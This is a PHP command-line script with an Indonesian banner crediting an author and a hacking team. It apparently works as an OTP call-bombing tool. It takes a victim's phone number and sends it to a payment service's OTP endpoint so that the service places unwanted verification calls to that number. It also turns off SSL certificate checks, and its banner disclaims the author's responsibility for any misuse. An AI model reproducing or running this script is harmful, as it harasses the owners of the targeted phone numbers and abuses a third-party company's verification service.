<?php
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
// Recodelah Jika Itu Skillmu
echo "═════════════════════════════════════════════════╣\n";
echo "╠╝  \033[1;30m✬  \033[31;0mAuthor     \033[91m:  \033[1;36mZheck Savalas            \033[1;33m   ║\n";
echo "╠╗  \033[1;30m✬  \033[31;0mInstagram  \033[91m:  \033[1;32m@ZackySaksakame       \033[1;33m      ║\n";
echo "║║  \033[1;30m✬  \033[31;0mYoutube    \033[91m:  \033[91mZackySaksakame   \033[1;33m          ╔╣\n";
echo "║║  \033[1;30m✬  \033[31;0mTeam       \033[91m:  \033[1;34mCyber Black White    \033[1;33m      ╠╣\n";
echo "╚╬══════════════════════════════════════════════╬╝\n";
echo "\033[1;33m╔╬══════════════════════════════════════════════╬╗\n";
echo "\033[1;33m╠╝\033[91m● \033[92mGunakan Script/Tools Ini Dengan Bijak Apapun\033[1;33m╚╣\n";
echo "\033[1;33m║   \033[92mResikonya Tidak Di Tanggung Oleh Author Nya  \033[1;33m║\n";
echo "\033[1;33m╠════════════════════════════════════════════════╝\n";
echo "\033[1;33m╠═════════════════╗\n";
echo "\033[1;33m╠═▶ \033[0mNb: \033[1;33m(\033[92m08XXX\033[1;33m)   ║\n";
echo "\033[1;33m╠═════════════════╝\nInput : ";
// Limit 3x Telpon Setiap Satu Nomor
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>